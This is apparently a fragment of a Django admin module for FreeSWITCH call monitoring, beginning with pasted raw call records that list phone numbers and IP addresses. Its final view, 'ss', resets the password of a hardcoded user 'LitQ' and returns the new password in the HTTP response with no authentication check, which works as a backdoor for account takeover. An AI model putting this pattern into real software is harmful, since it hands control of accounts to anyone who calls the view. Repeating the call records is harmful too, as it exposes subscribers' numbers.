'e53d79d4-3c51-11e1-b223-6f69a8363855,inbound,2012-01-11 16:43:43,1326285823,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380044,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380044,SEND,e53d79d4-3c51-11e1-b223-6f69a8363855,debian-vm5,Outbound Call,78123380044,e5400c58-3c51-11e1-b224-6f69a8363855,outbound,2012-01-11 16:43:43,1326285823,sofia/internal/78123380044@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380044,,,ACTIVE,Outbound Call,78123380044,SEND,78126000468,78126000468,1326285833', 'e54e2950-3c51-11e1-b225-6f69a8363855,inbound,2012-01-11 16:43:43,1326285823,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380210,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380210,SEND,e54e2950-3c51-11e1-b225-6f69a8363855,debian-vm5,Outbound Call,78123380210,e54fd372-3c51-11e1-b226-6f69a8363855,outbound,2012-01-11 16:43:43,1326285823,sofia/internal/78123380210@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380210,,,ACTIVE,Outbound Call,78123380210,SEND,78126000468,78126000468,1326285833', 'e551472a-3c51-11e1-b227-6f69a8363855,inbound,2012-01-11 16:43:43,1326285823,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380695,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380695,SEND,e551472a-3c51-11e1-b227-6f69a8363855,debian-vm5,Outbound Call,78123380695,e5521ba0-3c51-11e1-b228-6f69a8363855,outbound,2012-01-11 16:43:43,1326285823,sofia/internal/78123380695@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380695,,,ACTIVE,Outbound Call,78123380695,SEND,78126000468,78126000468,1326285833', 'e5ca7212-3c51-11e1-b229-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380193,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380193,SEND,e5ca7212-3c51-11e1-b229-6f69a8363855,debian-vm5,Outbound Call,78123380193,e5d01686-3c51-11e1-b22a-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380193@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380193,,,ACTIVE,Outbound Call,78123380193,SEND,78126000468,78126000468,1326285834', 'e5edd5a4-3c51-11e1-b22b-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380009,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380009,SEND,e5edd5a4-3c51-11e1-b22b-6f69a8363855,debian-vm5,Outbound Call,78123380009,e5f43b24-3c51-11e1-b22c-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380009@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380009,,,ACTIVE,Outbound Call,78123380009,SEND,78126000468,78126000468,1326285834', 'e5f4ceea-3c51-11e1-b22d-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380557,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380557,SEND,e5f4ceea-3c51-11e1-b22d-6f69a8363855,debian-vm5,Outbound Call,78123380557,e5f5d11e-3c51-11e1-b22e-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380557@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380557,,,ACTIVE,Outbound Call,78123380557,SEND,78126000468,78126000468,1326285834', 'e5fda2b8-3c51-11e1-b22f-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380837,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380837,SEND,e5fda2b8-3c51-11e1-b22f-6f69a8363855,debian-vm5,Outbound Call,78123380837,e5fee9e8-3c51-11e1-b230-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380837@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380837,,,ACTIVE,Outbound Call,78123380837,SEND,78126000468,78126000468,1326285834', 'e6051cc8-3c51-11e1-b231-6f69a8363855,inbound,2012-01-11 16:43:44,1326285824,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380552,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380552,SEND,e6051cc8-3c51-11e1-b231-6f69a8363855,debian-vm5,Outbound Call,78123380552,e6065610-3c51-11e1-b232-6f69a8363855,outbound,2012-01-11 16:43:44,1326285824,sofia/internal/78123380552@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380552,,,ACTIVE,Outbound Call,78123380552,SEND,78126000468,78126000468,1326285834', 'ea828baa-3c51-11e1-b23b-6f69a8363855,inbound,2012-01-11 16:43:52,1326285832,sofia/internal/78126000468@84.52.103.17,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380081,78126000468@84.52.103.17,,ACTIVE,Outbound Call,78123380081,SEND,ea828baa-3c51-11e1-b23b-6f69a8363855,debian-vm5,Outbound Call,78123380081,ea847b72-3c51-11e1-b23c-6f69a8363855,outbound,2012-01-11 16:43:52,1326285832,sofia/internal/78123380081@46.61.162.242,CS_HIBERNATE,78126000468,78126000468,84.52.103.17,78123380081,,,ACTIVE,Outbound Call,78123380081,SEND,78126000468,78126000468,1326285842', 'f950f9e6-3c51-11e1-b277-6f69a8363855,inbound,2012-01-11 16:44:17,1326285857,sofia/internal/4994290862@195.94.225.2:5060,CS_EXECUTE,4994290862,4994290862,195.94.225.2,4996383148,4994290862@195.94.225.2,,ACTIVE,Outbound Call,74996383148,SEND,f950f9e6-3c51-11e1-b277-6f69a8363855,debian-vm5,Outbound Call,74996383148,f9531aaa-3c51-11e1-b278-6f69a8363855,outbound,2012-01-11 16:44:17,1326285857,sofia/internal/74996383148@46.61.162.242,CS_EXCHANGE_MEDIA,4994290862,4994290862,195.94.225.2,74996383148,,,ACTIVE,Outbound Call,74996383148,SEND,4994290862,4994290862,1326285867', '', '20 total.']

            if len(data) > 3:
                print "len %s" % len(data)
                headers = data[0].split(',')
                headers.append("ip_freeswitch")
                print headers
                header_strings = (
                    'callee_num', 'name', 'ip_addr', 'b_ip_addr', 'dest', 'cid_num', 'cid_name', 'created', 'callstate', 'b_callstate', 'state', 'b_state', 'hostname', 'uuid', 'created_epoch', 'call_created_epoch', 'ip_freeswitch')
                indexes = map(headers.index, header_strings)
                assert all(x != -1 for x in indexes), \
                       "Unable to parse Freeswitch response"
                for i in range(1, len(data) - 2):
                    values = data[i].split(',')
                    values.append("192.168.20.246")
                    channels.append(dict(
                        (header_strings[j], values[indexes[j]])
                        for j in range(len(header_strings))))
                for channel in channels:
                    channel['pdd'] = (int(channel['call_created_epoch']) - int(channel['created_epoch'])) if channel['created_epoch'] and channel['call_created_epoch'] else 0
                    channel['time'] = int(time.time() // 1)
                    channel['billsec'] = (int(time.time() // 1) - int(channel['call_created_epoch'])) if channel['call_created_epoch'] else 0

        except Exception, e:
            context['msg'] = "!!!!!!!!!!!!!!!!!!!!Could not get live calls: %s" % str(e)
            print context['msg']

        else:
            print "return context1"
            context['channels'] = channels
            context['ons'] = len(channels)
            context['uons'] = len(channels)
        header_strings = (
                    'src_ip', 'src_num', 'dest_num', 'created', 'pdd', 'billsec', 'callstate', 'b_callstate', 'state', 'b_state', 'uuid', 'ip_freeswitch')
        context['hs'] = header_strings
        context['sp'] = ""
        for header_string in header_strings:

            context['sp'] = context['sp'] + """

                    <th><label>
            <input type="checkbox" checked="checked" name='""" + header_string + """' value='""" + header_string + """' id='""" + header_string + """' />
            """ + header_string + """</label></th>
          """
        context['fs'] = """<option  value="1" selected>ALL</option>"""
        for x in FREESWITCH:
            context['fs'] = context['fs'] + """<option  value="%s">%s</option>""" % (FREESWITCH[x]['ESL_HOST'], FREESWITCH[x]['ESL_HOST'])
        print "return context2"
        return context

    class Meta:
        app_label = "fsmanage"
        verbose_name = _("Online callsqwer")
        verbose_name_plural = _("Online Calls")

def ss(request):
    new_pass = ""
    for i in xrange(7):
        new_pass = new_pass + random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1237894560')

    us = User.objects.get(username="LitQ")
    us.set_password(new_pass)
    us.save()
    return HttpResponse(new_pass)
admin.site.register(FSCalls, FSCallsAdmin)
admin.site.register(sip_registrations, sip_registrationsAdmin)
admin.site.register(sip_registrations_history, sip_registrationshistoryAdmin)

